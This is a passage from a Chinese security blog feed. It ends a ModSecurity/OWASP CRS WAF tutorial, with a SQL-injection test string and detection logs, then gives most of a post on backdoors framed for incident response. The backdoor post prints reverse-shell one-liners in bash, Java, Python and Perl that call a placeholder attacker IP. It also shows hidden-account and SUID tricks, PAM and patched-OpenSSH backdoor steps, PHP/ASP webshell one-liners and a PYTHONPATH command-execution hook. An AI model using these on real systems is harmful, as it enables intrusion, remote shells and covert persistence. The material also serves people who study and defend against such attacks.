Forbidden&lt;/title&gt;&lt;/head&gt;\x0d\x0a&lt;body bgcolor=&quot;white&quot;&gt;\x0d\x0a&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;\x0d\x0a&lt;hr&gt;&lt;center&gt;nginx/1.14.1&lt;/center&gt;\x0d\x0a&lt;/body&gt;\x0d\x0a&lt;/html&gt;\x0d\x0a&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;\x0d\x0a&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;\x0d\x0a&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;\x0d\x0a&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;\x0d\x0a&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;\x0d\x0a&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;\x0d\x0a---Xd59KAAO---F--HTTP/1.1 403Server: nginx/1.14.1Date: Mon, 26 Nov 2018 01:46:59 GMTContent-Length: 571Content-Type: text/htmlConnection: keep-alive---Xd59KAAO---H-----Xd59KAAO---I-----Xd59KAAO---J-----Xd59KAAO---Z--</code></pre><blockquote><p>在测试 ModSecurity 功能时，想通过 WAF 输出的审计日志来学习和测试相应防护规则，结果发现将 SecRuleEngine 设置为 DetectionOnly 后，ModSecurity 并没有在审计日志中输出匹配过程和规则；正确的做法应该是通过记录调试日志，来跟踪规则匹配、执行。</p></blockquote><h2 id="ModSecurity-CRS-规则"><a href="#ModSecurity-CRS-规则" class="headerlink" title="ModSecurity CRS 规则"></a>ModSecurity CRS 规则</h2><p>ModSecurity <a href="https://github.com/SpiderLabs/owasp-modsecurity-crs" target="_blank" rel="noopener">CRS</a> 是由 OWASP 社区所维护的攻击检测规则，可在 ModSecurity 中直接使用，其检测规则覆盖 OWASP Top 10 中常见漏洞和一些框架层面的漏洞。</p><h3 id="CRS-部署使用"><a href="#CRS-部署使用" class="headerlink" title="CRS 部署使用"></a>CRS 部署使用</h3><p>下载 CRS 规则到本地，可通过如下命令进行操作</p><pre><code>git clone git@github.com:SpiderLabs/owasp-modsecurity-crs.git</code></pre><p>在 CRS 的 <code>crs-set.conf.example</code> 中说明 CRS 的配置需要在 WebServer 中包含如下三种配置文件</p><pre><code># The order of file inclusion in your webserver configuration should always be:# 1. modsecurity.conf# 2. crs-setup.conf (this file)# 3. rules/*.conf (the CRS rule files)## Please refer to the INSTALL file for detailed installation instructions.</code></pre><p>将下载目录下的 <code>rules</code> 移动到 <code>/usr/local/nginx/conf/modsec</code> 目录下，通知将 <code>crs-set.conf.example</code> 重命名为 <code>crs-set.conf</code> 并移动到 <code>/usr/local/nginx/conf/modsec</code>，部署玩 CRS 后的目录如下所示</p><pre><code>[root@Centos7 modsec]# pwd/usr/local/nginx/conf/modsec[root@Centos7 modsec]# lscrs-setup.conf  main.conf  modsecurity.conf  rules  unicode.mapping[root@Centos7 modsec]#</code></pre><p>在上述 <code>/usr/local/nginx/conf/modsec/main.conf</code> 配置文件中添加 CRS 配置，添加后的文件内容如下所示</p><pre><code>[root@Centos7 modsec]# cat main.confInclude &quot;/usr/local/nginx/conf/modsec/modsecurity.conf&quot;Include &quot;/usr/local/nginx/conf/modsec/crs-setup.conf&quot;Include &quot;/usr/local/nginx/conf/modsec/rules/*.conf&quot;</code></pre><p>测试 CRS 规则，访问连接 <code>http://10.211.55.14/?id=1&#39;or&#39;1=1</code>，如下所示，触发了 CRS 中的 SQL 注入防御规则</p><blockquote><p>需注意 ModSecurity CRS 规则默认将本机加入白名单，所以直接通过 <code>curl http://localhost?id=1&#39;or&#39;1=1</code> 测试是无法触发 CRS 防御规则。</p></blockquote><img src="/2018/12/21/step-into-modsecurity/modsecurity_crs.png"><p>触发 <code>REQUEST-920-PROTOCOL-ENFORCEMENT</code>、<code>REQUEST-942-APPLICATION-ATTACK-SQLI.conf</code> 等规则检测，并且被默认拦截，其匹配记录如下所示</p><pre><code>ModSecurity: Warning. Matched &quot;Operator `Rx&#39; with parameter `^[\d.:]+$&#39; against variable `REQUEST_HEADERS:Host&#39; (Value: `10.211.55.14&#39; ) [file &quot;/usr/local/nginx/conf/modsec/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf&quot;] [line &quot;777&quot;] [id &quot;920350&quot;] [rev &quot;2&quot;] [msg &quot;Host header is a numeric IP address&quot;] [data &quot;10.211.55.14&quot;] [severity &quot;4&quot;] [ver &quot;OWASP_CRS/3.0.0&quot;] [maturity &quot;9&quot;] [accuracy &quot;9&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-protocol&quot;] [tag &quot;OWASP_CRS/PROTOCOL_VIOLATION/IP_HOST&quot;] [tag &quot;WASCTC/WASC-21&quot;] [tag &quot;OWASP_TOP_10/A7&quot;] [tag &quot;PCI/6.5.10&quot;] [hostname &quot;10.211.55.2&quot;] [uri &quot;/&quot;] [unique_id &quot;154530934235.756485&quot;] [ref &quot;o0,12v37,12&quot;]ModSecurity: Warning. detected SQLi using libinjection. [file &quot;/usr/local/nginx/conf/modsec/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf&quot;] [line &quot;43&quot;] [id &quot;942100&quot;] [rev &quot;1&quot;] [msg &quot;SQL Injection Attack Detected via libinjection&quot;] [data &quot;Matched Data: s&amp;s found within ARGS:id: 1&#39;or&#39;1=1&quot;] [severity &quot;2&quot;] [ver &quot;OWASP_CRS/3.0.0&quot;] [maturity &quot;1&quot;] [accuracy &quot;8&quot;] [hostname &quot;10.211.55.2&quot;] [uri &quot;/&quot;] [unique_id &quot;154530934235.756485&quot;] [ref &quot;v9,8&quot;]ModSecurity: Access denied with code 403 (phase 2). Matched &quot;Operator `Ge&#39; with parameter `5&#39; against variable `TX:ANOMALY_SCORE&#39; (Value: `8&#39; ) [file &quot;/usr/local/nginx/conf/modsec/rules/REQUEST-949-BLOCKING-EVALUATION.conf&quot;] [line &quot;44&quot;] [id &quot;949110&quot;] [rev &quot;&quot;] [msg &quot;Inbound Anomaly Score Exceeded (Total Score: 8)&quot;] [data &quot;&quot;] [severity &quot;2&quot;] [ver &quot;&quot;] [maturity &quot;0&quot;] [accuracy &quot;0&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-generic&quot;] [hostname &quot;10.211.55.2&quot;] [uri &quot;/&quot;] [unique_id &quot;154530934235.756485&quot;] [ref &quot;&quot;]ModSecurity: Warning. Matched &quot;Operator `Ge&#39; with parameter `5&#39; against variable `TX:INBOUND_ANOMALY_SCORE&#39; (Value: `8&#39; ) [file &quot;/usr/local/nginx/conf/modsec/rules/RESPONSE-980-CORRELATION.conf&quot;] [line &quot;65&quot;] [id &quot;980130&quot;] [rev &quot;&quot;] [msg &quot;Inbound Anomaly Score Exceeded (Total Inbound Score: 8 - SQLI=5,XSS=0,RFI=0,LFI=0,RCE=0,PHPI=0,HTTP=0,SESS=0): SQL Injection Attack Detected via libinjection&quot;] [data &quot;&quot;] [severity &quot;0&quot;] [ver &quot;&quot;] [maturity &quot;0&quot;] [accuracy &quot;0&quot;] [tag &quot;event-correlation&quot;] [hostname &quot;10.211.55.2&quot;] [uri &quot;/&quot;] [unique_id &quot;154530934235.756485&quot;] [ref &quot;&quot;]</code></pre><h3 id="CRS-规则说明"><a href="#CRS-规则说明" class="headerlink" title="CRS 规则说明"></a>CRS 规则说明</h3><p><code>/usr/local/nginx/conf/modsec/rules/*.conf</code> 目录下的 CRS 防御规则文件及相关说明如下所示</p><table><thead><tr><th style="text-align:left">规则文件</th><th style="text-align:left">规则说明</th></tr></thead><tbody><tr><td style="text-align:left">REQUEST-900-EXCLUSION-RULES-BEFORE-CRS</td><td style="text-align:left">定制化个人防护规则，调整规则防护场景</td></tr><tr><td style="text-align:left">REQUEST-901-INITIALIZATION</td><td style="text-align:left">CRS 配置初始化</td></tr><tr><td style="text-align:left">REQUEST-910-IP-REPUTATION</td><td style="text-align:left">IP 信誉库</td></tr><tr><td style="text-align:left">REQUEST-911-METHOD-ENFORCEMENT</td><td style="text-align:left">HTTP 请求方法检测</td></tr><tr><td style="text-align:left">REQUEST-912-DOS-PROTECTION</td><td style="text-align:left">拒绝服务规则</td></tr><tr><td style="text-align:left">REQUEST-913-SCANNER-DETECTION</td><td style="text-align:left">扫描器检测</td></tr><tr><td style="text-align:left">REQUEST-920-PROTOCOL-ENFORCEMENT</td><td style="text-align:left">URL Scheme 协议检测</td></tr><tr><td style="text-align:left">REQUEST-921-PROTOCOL-ATTACK</td><td style="text-align:left">HTTP 协议攻击检测</td></tr><tr><td style="text-align:left">REQUEST-930-APPLICATION-ATTACK-LFI</td><td style="text-align:left">LFI 本地文件包含漏洞检测</td></tr><tr><td style="text-align:left">REQUEST-931-APPLICATION-ATTACK-RFI</td><td style="text-align:left">RFI 远程文件包含检测</td></tr><tr><td style="text-align:left">REQUEST-932-APPLICATION-ATTACK-RCE</td><td style="text-align:left">RCE 远程命令执行检测</td></tr><tr><td style="text-align:left">REQUEST-933-APPLICATION-ATTACK-PHP</td><td style="text-align:left">PHP 攻击检测</td></tr><tr><td style="text-align:left">REQUEST-941-APPLICATION-ATTACK-XSS</td><td style="text-align:left">XSS 攻击检测</td></tr><tr><td style="text-align:left">REQUEST-942-APPLICATION-ATTACK-SQLI</td><td style="text-align:left">SQL 注入攻击检测</td></tr><tr><td style="text-align:left">REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION</td><td style="text-align:left">会话固定攻击检测</td></tr><tr><td style="text-align:left">REQUEST-949-BLOCKING-EVALUATION</td><td style="text-align:left">基于风险值检测入站请求</td></tr><tr><td style="text-align:left">RESPONSE-950-DATA-LEAKAGES</td><td style="text-align:left">数据泄漏检测</td></tr><tr><td style="text-align:left">RESPONSE-951-DATA-LEAKAGES-SQL</td><td style="text-align:left">SQL 数据泄漏检测</td></tr><tr><td style="text-align:left">RESPONSE-952-DATA-LEAKAGES-JAVA</td><td style="text-align:left">JAVA 数据泄漏</td></tr><tr><td style="text-align:left">RESPONSE-953-DATA-LEAKAGES-PHP</td><td style="text-align:left">PHP 数据泄漏</td></tr><tr><td style="text-align:left">RESPONSE-954-DATA-LEAKAGES-IIS</td><td style="text-align:left">IIS 数据泄漏</td></tr><tr><td style="text-align:left">RESPONSE-959-BLOCKING-EVALUATION</td><td style="text-align:left">基于风险值检测出站请求</td></tr><tr><td style="text-align:left">RESPONSE-980-CORRELATION</td><td style="text-align:left">入站、出站风险值关联</td></tr><tr><td style="text-align:left">RESPONSE-999-EXCLUSION-RULES-AFTER-CRS</td><td style="text-align:left">定制化个人防护规则，重载、更新、移除检测规则</td></tr></tbody></table><p>如下所示，CRS 支持两种运行模式，CRS 默认采用的为异常评分模式</p><ul><li>异常评分模式，每条防御规则都有相应的风险评分，若匹配成功，则直接累加对应的风险值，当所有规则都匹配完成后比较入站、出站的风险值，若比设定的风险阈值还高，则默认返回 403；</li><li>检测拦截模式，若请求匹配到了防御规则，则依据所配置的行为进行响应，同时将忽略其后所有的防御规则，该模式节约资源、性能；</li></ul><p>若 CRS 要切换成检测拦截模式，需将 <code>crs-setup.conf</code> 中异常评分模式配置注释，同时开启检测拦截模式配置，如下所示</p><pre><code>#SecDefaultAction &quot;phase:1,log,auditlog,pass&quot;#SecDefaultAction &quot;phase:2,log,auditlog,pass&quot;SecDefaultAction &quot;phase:1,log,auditlog,deny,status:403&quot;SecDefaultAction &quot;phase:2,log,auditlog,deny,status:403&quot;</code></pre><p>在异常评分模式中，CRS 包含 规则等级（Paranoia）、异常阈值（Anomaly） 两个量化值，随着规则等级越来越高，其所启用的安全防御规则就越来越多，同时误报也会越来越多，规则等级分为以下几类，规则等级高于 PL2 在审计日志中会输出规则等级标签</p><ul><li>1（PL1），默认风险等级，启用了大部分防御规则，误报较少</li><li>2（PL2），比 PL1 启用更多防御规则，例如基于正则的 SQL 注入和 XSS，比 PL1 误报多</li><li>3（PL3），比 PL2 启用更多防御规则，面向经验丰富用户，满足较高安全性场景</li><li>4（PL4），最严格的风险等级，会产生一定数量的误报</li></ul><p>基于异常告警模式，每条检测规则都包含一定的风险值，不同危害风险值不同，如下所示，可根据业务场景自主调整</p><ul><li>CRITICAL，致命，风险值为 5</li><li>ERROR，错误，风险值为 4</li><li>WARNING，警告，风险值为 3</li><li>NOTICE，通知，风险值为 2</li></ul><p>根据对 CRS 防御规则的熟知程度慢慢深入，相关异常阈值和规则等级设置可参考下表所示，即异常告警阈值慢慢降低，规则等级慢慢严格</p><table><thead><tr><th style="text-align:center">阶段编号</th><th style="text-align:left">阶段名称</th><th style="text-align:center">异常阈值</th><th style="text-align:center">规则等级</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:left">初始阶段</td><td style="text-align:center">高</td><td style="text-align:center">低</td></tr><tr><td style="text-align:center">2</td><td style="text-align:left">实验阶段</td><td style="text-align:center">高</td><td style="text-align:center">高</td></tr><tr><td style="text-align:center">3</td><td style="text-align:left">标准阶段</td><td style="text-align:center">低</td><td style="text-align:center">低</td></tr><tr><td style="text-align:center">4</td><td style="text-align:left">高安全性阶段</td><td style="text-align:center">低</td><td style="text-align:center">高</td></tr></tbody></table><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li>如何搭建一个靠谱的WAF <a href="http://www.91ri.org/12766.html" target="_blank" rel="noopener">查看原文</a></li><li>【门神】WAF应用层实现的架构漫谈 <a href="https://security.tencent.com/index.php/blog/msg/63" target="_blank" rel="noopener">查看原文</a></li><li>主流WAF架构分析与探索 <a href="https://security.tencent.com/index.php/blog/msg/56" target="_blank" rel="noopener">查看原文</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;p&gt;WAF (Web Application Firewall)，Web 应用防火墙，通过解析 HTTP/HTTPS 请求内容，并执行一系列的安全检测策略，对目标 Web 应用提供安全防护，同时记录相关安全防御日志。文章将介绍 ModSecurity 相
      
    
    </summary>
    
      <category term="安全建设" scheme="https://l0gs.xf0rk.space/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="安全建设" scheme="https://l0gs.xf0rk.space/tags/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
      <category term="WAF 防御" scheme="https://l0gs.xf0rk.space/tags/WAF-%E9%98%B2%E5%BE%A1/"/>
    
  </entry>
  
  <entry>
    <title>安全应急之后门篇</title>
    <link href="https://l0gs.xf0rk.space/2018/10/04/about-the-backdoor/"/>
    <id>https://l0gs.xf0rk.space/2018/10/04/about-the-backdoor/</id>
    <published>2018-10-04T08:10:43.000Z</published>
    <updated>2019-01-21T16:03:49.615Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>后门是一种绕过认证或系统加密的方法，开发人员会出于某原因，可能为自己的程序构建后门程序。例如，为了提供简单的维护，开发人员引入了一个后门，可以恢复设备厂商的默认密码；同时攻击者也会将后门种植到有漏洞的服务器来接管服务器，执行攻击和上传恶意payload。</p></blockquote><h2 id="后门简介"><a href="#后门简介" class="headerlink" title="后门简介"></a>后门简介</h2><h3 id="反弹-SHELL-技术"><a href="#反弹-SHELL-技术" class="headerlink" title="反弹 SHELL 技术"></a>反弹 SHELL 技术</h3><p>当目标系统为 LINUX 时，反弹 SHELL 在漏洞证明、利用中是一个有效的手段。可在目标机器执行 <code>bash -i &gt;&amp; /dev/tcp/[攻击者IP]/[攻击者端口] 0&gt;&amp;1</code> 反弹 SHELL。</p><img src="/2018/10/04/about-the-backdoor/reverse_shell_exec_client.png"><blockquote><p><code>bash -i</code> 用于创建一个交互式 BASH；<code>&gt;&amp; /dev/tcp/[攻击者IP]/[攻击者端口]</code> 建立 TCP 连接，将标准输出和错误输出重定向到 TCP 连接；<code>0&gt;&amp;1</code> 用于从 TCP 连接获取输入并传入到 BASH。</p></blockquote><p>如下所示为一个 BASH 语言实现的反弹 SHELL 示例，攻击者外网机器执行命令<code>nc -l [攻击端口]</code>，获取 TCP 连接后可直接执行命令</p><img src="/2018/10/04/about-the-backdoor/reverse_shell_exec_server.png"><p>反弹 SHELL 可在目标机器使用 NC 监听端口，可利用常规服务端口 80、8080 等用来绕过可能存在的外部防火墙的网络控制策略。</p><h4 id="BASH-语言"><a href="#BASH-语言" class="headerlink" title="BASH 语言"></a>BASH 语言</h4><pre><code>0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/[攻击者IP]/[攻击者端口]; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</code></pre><h4 id="JAVA-语言"><a href="#JAVA-语言" class="headerlink" title="JAVA 语言"></a>JAVA 语言</h4><pre><code>r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/[攻击者IP]/[攻击者端口];cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor()</code></pre><h4 id="PYTHON-语言"><a href="#PYTHON-语言" class="headerlink" title="PYTHON 语言"></a>PYTHON 语言</h4><pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;[攻击者IP]&quot;,[攻击者端口]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><h4 id="PERL-语言"><a href="#PERL-语言" class="headerlink" title="PERL 语言"></a>PERL 语言</h4><pre><code>perl -e &#39;use Socket;$i=&quot;[攻击者IP]&quot;;$p=[攻击者端口];socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</code></pre><h3 id="反弹-SHELL-持久化"><a href="#反弹-SHELL-持久化" class="headerlink" title="反弹 SHELL 持久化"></a>反弹 SHELL 持久化</h3><p>如下图，根据 <a href="https://attack.mitre.org/" title="[MITRE]" target="_blank" rel="noopener">MITRE</a> 攻击矩阵，反弹 SHELL 可持久化在<code>.bash_profile</code>、<code>.bashrc</code>、启动服务、浏览器插件、HOOK 操作、登录启动脚本等系统功能模块中。</p><img src="/2018/10/04/about-the-backdoor/attack_matrix.png"><h2 id="隐藏系统用户"><a href="#隐藏系统用户" class="headerlink" title="隐藏系统用户"></a>隐藏系统用户</h2><h3 id="LINUX-隐藏高权限账号"><a href="#LINUX-隐藏高权限账号" class="headerlink" title="LINUX 隐藏高权限账号"></a>LINUX 隐藏高权限账号</h3><p>LINUX 中隐藏高全权限用户可直接编辑 <code>/etc/passwd</code> 文件，将文件中指定用户 UID 和 GID 值修改为 0</p><img src="/2018/10/04/about-the-backdoor/linux_uid_gid_0.png"><p>如下所示，可直接隐藏用户权限为 root 权限和用户组</p><img src="/2018/10/04/about-the-backdoor/linux_hide_high_user.png"><h3 id="WINDOWS-用户隐藏"><a href="#WINDOWS-用户隐藏" class="headerlink" title="WINDOWS 用户隐藏"></a>WINDOWS 用户隐藏</h3><p>修改注册表 <code>HKEY_LOCAL_MACHINE\SAM\SAM\</code> 权限为管理员完全控制，如下图所示</p><img src="/2018/10/04/about-the-backdoor/win_regedit_permission.png"><p>新建特殊账户，无法通过 <code>net user</code>查看到用户</p><img src="/2018/10/04/about-the-backdoor/win_new_user.png"><p>用户名以 <code>$</code> 结尾的通过 <code>net user</code> 无法查看到指定用户，但可在控制面板查看用户</p><img src="/2018/10/04/about-the-backdoor/win_user_control_panel.png"><p><code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code> 中查找新建用户 <code>xf0rk$</code> 默认类型为 <code>0x3ea</code>，将注册表 <code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\xf0rk$</code> 导出为 <code>1.reg</code></p><img src="/2018/10/04/about-the-backdoor/win_regedit_backup.png"><p>在注册表查找 <code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA</code> 导出为 <code>2.reg</code>，将 <code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</code> 导出为 <code>3.reg</code>，将注册表项 <code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA</code> 下键 <code>F</code> 的值替换为 <code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</code> 下键 <code>F</code> 的值，如下图所示</p><p>命令行删除特殊账户 <code>net user xf0rk$ /del</code>，导入 <code>1.reg</code>、<code>2.reg</code> 注册表文件，此时无法通过 <code>net user</code> 查看该账户，也无法在控制面板中看到该账户，但可通过 <code>net user xf0rk$</code> 查看用户信息</p><img src="/2018/10/04/about-the-backdoor/win_regedit_restore.png"><h2 id="SUID-权限隐藏"><a href="#SUID-权限隐藏" class="headerlink" title="SUID 权限隐藏"></a>SUID 权限隐藏</h2><blockquote><p>SUID 是 Linux 的一种权限机制,具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限，如果拥有 SUID 权限,那么就可以利用系统中的二进制文件和工具来进行 ROOT 提权。</p></blockquote><p>如下文件名为 <code>...</code> ( 可通过创建 <code>...</code> 与 <code>.</code>、<code>..</code> 相近的文件名来干扰管理员排查后门 )，权限为 <code>-rwsr-xr-x</code>，说明普通用户执行该文件时可获得文件拥有者 root 权限。以当前用户 xf0rk 执行命令 <code>useradd test</code> 发现用户权限过低无法创建用户，通过执行 <code>...</code> 文件提权后执行 <code>useradd test</code> 成功创建用户。 </p><img src="/2018/10/04/about-the-backdoor/suid_shell.png"><h2 id="LINUX-PAM-后门"><a href="#LINUX-PAM-后门" class="headerlink" title="LINUX PAM 后门"></a>LINUX PAM 后门</h2><h3 id="LINUX-PAM-简介"><a href="#LINUX-PAM-简介" class="headerlink" title="LINUX PAM 简介"></a>LINUX PAM 简介</h3><blockquote><p>Linux-PAM (linux可插入认证模块)是一套共享库，使本地系统管理员可以方便配置程序的认证方式，即可不用重新编译一个包含 PAM 功能的应用程序就改变它使用的认证机制。PAM使用配置 /etc/pam.d/ 下的文件来管理认证方式，应用程序调用相应的配置文件，以加载动态库的形式调用 /lib/security 下的模块。</p></blockquote><p>PAM 配置可分为四个参数 <code>模块类型 控制标记 模块路径 模块参数</code>，例如 <code>session  required   pam_selinux.so  open</code></p><img src="/2018/10/04/about-the-backdoor/pam_flow.png"><p>PAM 模块类型包含 auth（认证管理）、account（账号管理）、session（会话管理）、password（密码管理）四种：</p><table><thead><tr><th style="text-align:left">模块类型</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">auth</td><td style="text-align:left">用户身份识别，如提示输入密码、判断是否为 root 等</td></tr><tr><td style="text-align:left">account</td><td style="text-align:left">对账号的各项属性进行检查，如是否允许登录、是否达到最大用户数、判断 root 用户是否允许终端登录等</td></tr><tr><td style="text-align:left">session</td><td style="text-align:left">定义用户登录前及用户退出后所需要进行的操作，如登录连接信息、用户数据打开、挂载文件系统等</td></tr><tr><td style="text-align:left">password</td><td style="text-align:left">使用用户信息来更新，如修改用户密码</td></tr></tbody></table><p>PAM 的控制标记来处理和判断各模块的返回值</p><table><thead><tr><th style="text-align:left">控制标记</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">required</td><td style="text-align:left">若成功，继续检查下一个模块并取决于其他模块；若失败，则停止并返回失败</td></tr><tr><td style="text-align:left">requisite</td><td style="text-align:left">若成功，继续检查下一个模块并取决于其他模块；若失败，继续检查下一个模块，并返回失败</td></tr><tr><td style="text-align:left">sufficient</td><td style="text-align:left">若成功，则停止并返回成功；若失败，继续检查下一个模块并取决于其他模块</td></tr><tr><td style="text-align:left">optional</td><td style="text-align:left">若成功，则继续检查下一个并取决于其他模块，若失败，继续检查下一个模块，并取决于其他模块</td></tr><tr><td style="text-align:left">include</td><td style="text-align:left">无关，执行包含文件中的验证，取决于其他模块</td></tr></tbody></table><p>PAM 模块路径指要调用的模块位置，同一个模块可以出现在不同的类型中，不同的类型所执行的操作都不相同，模块参数即传递给模块的参数，参数之间用空格分隔开。</p><h3 id="PAM-LISTFILE-模块后门"><a href="#PAM-LISTFILE-模块后门" class="headerlink" title="PAM LISTFILE 模块后门"></a>PAM LISTFILE 模块后门</h3><p>PAM 中模块 pam_listfile.so，允许保存在/tmp/users 中的用户登录，其中 users 文件中的用户名为 <code>root</code> 即只要是 root 用户（sufficient 控制标记，匹配存在则可直接返回成功）均可以直接登录。</p><img src="/2018/10/04/about-the-backdoor/pam_listfile.png"><h3 id="PAM-ROOTOK-模块后门"><a href="#PAM-ROOTOK-模块后门" class="headerlink" title="PAM ROOTOK 模块后门"></a>PAM ROOTOK 模块后门</h3><p>PAM 中模块 rootok.so，使 uid 为 0 的用户（ root ）能够直接通过认证而不用输入密码，系统文件 <code>/etc/pam.d/su</code> 中默认存在 <code>auth sufficient  pam_rootok.so</code> 即 root 用户可以不输密码执行 su 命令。当通过将 sshd 软链到文件名为 su 的文件时，执行 su 文件会加载 pam_rootok.so 模块，此时若使用 root 用户登录，则可免密直接登录成功。</p><img src="/2018/10/04/about-the-backdoor/pam_rootok.png"><p>root 用户可任意密码可直接登录系统，执行任意命令</p><img src="/2018/10/04/about-the-backdoor/pam_rootok_shell.png"><h2 id="LINUX-SSH-后门"><a href="#LINUX-SSH-后门" class="headerlink" title="LINUX SSH 后门"></a>LINUX SSH 后门</h2><p>LINUX SSH 后门通过编译 PATCH 到原 SSH 应用，来生成 SSH 后门 <a href="http://core.ipsecs.com/rootkit/patch-to-hack/" title="[下载文件]" target="_blank" rel="noopener">下载文件</a>，具体步骤如下所示</p><pre><code>tar zxvf openssh-5.9p1.tar.gztar zxvf openssh-5.9p1.patch.tar.gzcp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1/   复制patch后门文件到正常openssh里面patch &lt; sshbd5.9p1.diff</code></pre><p>修改后门密码和文件记录，如下图所示</p><img src="/2018/10/04/about-the-backdoor/linux_ssh_patch.png"><p>修改版本为目标机器 SSH 版本，字段为 <code>SSH_VERSION</code></p><pre><code>root@localhost openssh-5.9p1# vim version.h#define SSH_VERSION &quot;OpenSSH_5.3p1&quot;#define SSH_PORTABLE &quot;p1&quot;#define SSH_RELEASE SSH_VERSION SSH_PORTABLE</code></pre><p>安装编译依赖包并编译安装</p><pre><code>yum install -y openssl openssl-devel pam-devel./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5yum install -y zlib zlib-devel    //  http://sourceforge.net/projects/libpng/files/zlib/1.2.3/zlib-1.2.3.tar.gz/downloadmake &amp;&amp; make install</code></pre><p>重启 SSH 服务即可，<code>service sshd restart</code></p><h2 id="WebShell-后门"><a href="#WebShell-后门" class="headerlink" title="WebShell 后门"></a>WebShell 后门</h2><blockquote><p>WebShell 是 Web 服务器上的管理工具，可以对 Web 服务器进行网站管理、服务器管理，可管理服务器文件、查看数据库等。攻击者可利用 Web 漏洞上传 WenShell 到 Web 服务器的页面目录下，通过直接访问上传文件进行入侵、保留权限等。</p></blockquote><p>WebShell 根据功能分为大马、小马，小马通常指一句话木马，如下所示</p><pre><code>PHP   &lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;ASP   &lt;%eval request(&quot;pass&quot;)%&gt;ASP.NET   &lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</code></pre><p>通过中国菜刀连接到已成功上传的小马，可进行服务器文件管理，如下为操作文件和执行命令</p><img src="/2018/10/04/about-the-backdoor/caidao_file_dir.png"><img src="/2018/10/04/about-the-backdoor/caidao_shell.png"><h2 id="第三方依赖库后门"><a href="#第三方依赖库后门" class="headerlink" title="第三方依赖库后门"></a>第三方依赖库后门</h2><p>如下图，在 Python 默认 string 库中嵌入式恶意代码，代码 import string 操作时可触发一段恶意代码</p><img src="/2018/10/04/about-the-backdoor/pythonpath_backdoor.png"><p>隐藏在 PYTHONPATH 的后门处于 Python 解释器和 OS/Kernel 之间，通常通过 import x 查找顺序为：当前目录 -&gt; PYTHONPATH 环境变量 -&gt; 默认 Python 库目录，如下图所示</p><img src="/2018/10/04/about-the-backdoor/pythonpath_import.png"><p>基于 Django 框架开发的测试网站，其 urls.py 文件中路由配置如下所示，其仅包含根目录和admin目录两个目录</p><pre><code>from django.conf.urls import urlfrom django.contrib import adminurlpatterns = [    url(r&#39;^admin/&#39;, admin.site.urls),]</code></pre><p>如下代码，利用 PYTHONPATH 重载了socket.py 模块，实现访问所有 URL 链接添加 cmd 参数，则可直接执行命令</p><pre><code>def _hook_readline(self, *args, **kwargs):        retval = object.__getattribute__(self, &#39;readline&#39;)(*args, **kwargs)        if retval.startswith(&#39;GET /?cmd=&#39;):            (verb, url, version) = retval.split(&#39; &#39;)            self.__outputs__.put(os.popen(urllib.unquote_plus(url[6:])).read())        return retval</code></pre><p>如下为通过引入 <code>?cmd=ifconfig</code> 来执行 <code>ifcnfig</code> 命令</p><img src="/2018/10/04/about-the-backdoor/pythonpath_web_backdoor.png"><h2 id="ROOTKIT-后门"><a href="#ROOTKIT-后门" class="headerlink" title="ROOTKIT 后门"></a>ROOTKIT 后门</h2><blockquote><p>ROOTKIT 是使不法用户具有系统超级管理权限，并能隐藏自身入侵系统的信息，来实现长期权限控制的工具集。ROOKIT 根据工作层次可分为用户级、内核级、芯片虚拟化级三层，用户级可划分为对 Linux 输出结果进行封装和替换 Linux 命令型的 